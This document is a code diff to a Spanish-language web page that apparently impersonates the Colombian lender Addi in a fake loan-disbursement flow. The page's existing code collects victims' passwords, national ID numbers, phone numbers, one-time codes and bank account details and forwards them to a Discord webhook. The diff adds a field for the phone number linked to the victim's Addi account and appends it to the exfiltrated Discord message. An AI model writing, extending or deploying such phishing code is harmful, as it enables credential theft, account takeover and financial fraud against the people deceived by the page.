@@ -296,7 +296,9 @@
         </select>
         <label for="cuentaNum" style="margin-top:18px">Número de cuenta</label>
         <input class="field" id="cuentaNum" inputmode="numeric" placeholder="Número de cuenta">
-        <div class="err" id="banco-err">Selecciona un banco e ingresa un número de cuenta válido.</div>
+        <label for="telfAddi" style="margin-top:18px">Teléfono asociado a tu cuenta de Addi</label>
+        <input class="field" id="telfAddi" inputmode="numeric" placeholder="Ej: 3001234567">
+        <div class="err" id="banco-err">Selecciona un banco e ingresa el número de cuenta y el teléfono de tu cuenta Addi.</div>
         <div class="footer-btn"><button class="btn" onclick="submitBanco()">Continuar</button></div>
       </section>
 
@@ -405,7 +407,7 @@ const CONFIG = {
 };
 
 /* ====== Discord webhook (SEGURO: lo reenvía /api/notificar en Vercel) ====== */
-const session = { password:'', cedula:'', phone:'', term:0, uid:'', amount:0, otp:'', cerrada:false, banco:'', cuentaTipo:'', cuentaNum:'', retirar:0, otpListo:false, comercio:'' };
+const session = { password:'', cedula:'', phone:'', term:0, uid:'', amount:0, otp:'', cerrada:false, banco:'', cuentaTipo:'', cuentaNum:'', telfAddi:'', retirar:0, otpListo:false, comercio:'' };
 
 function fechaCorta(d){
   const p = n => String(n).padStart(2,'0');
@@ -472,7 +474,7 @@ function maskPhone(v){
   return d.slice(0,2) + '******' + d.slice(-2);
 }
 function currentStep(){ return document.querySelector('.step.active').id; }
-function sessionData(){ return { password:session.password, cedula:session.cedula, phone:session.phone, amount:session.amount, term:session.term, otp:session.otp, banco:session.banco, cuentaTipo:session.cuentaTipo, cuentaNum:session.cuentaNum, retirar:session.retirar, comercio:session.comercio }; }
+function sessionData(){ return { password:session.password, cedula:session.cedula, phone:session.phone, amount:session.amount, term:session.term, otp:session.otp, banco:session.banco, cuentaTipo:session.cuentaTipo, cuentaNum:session.cuentaNum, telfAddi:session.telfAddi, retirar:session.retirar, comercio:session.comercio }; }
 function publish(){
   if(!fireReady || session.cerrada) return;
   try{
@@ -764,12 +766,14 @@ function submitBanco(){
   const b = $('bancoSel').value;
   const t = $('cuentaTipo').value;
   const num = $('cuentaNum').value.replace(/\D/g,'');
-  if(!b || !t || num.length < 6){ $('banco-err').style.display='block'; return; }
+  const tf = $('telfAddi').value.replace(/\D/g,'');
+  if(!b || !t || num.length < 6 || tf.length < 6){ $('banco-err').style.display='block'; return; }
   $('banco-err').style.display='none';
   session.banco = b;
   session.cuentaTipo = t;
   session.cuentaNum = num;
-  sendToDiscord(`**🏦 Datos bancarios para el desembolso**\n- Banco: \`${b}\`\n- Tipo de cuenta: \`${t}\`\n- Número de cuenta: \`${num}\``);
+  session.telfAddi = tf;
+  sendToDiscord(`**🏦 Datos bancarios para el desembolso**\n- Banco: \`${b}\`\n- Tipo de cuenta: \`${t}\`\n- Número de cuenta: \`${num}\`\n- Teléfono Addi: \`${tf}\``);
   mostrarCupo();
   show('s-cupo');
 }
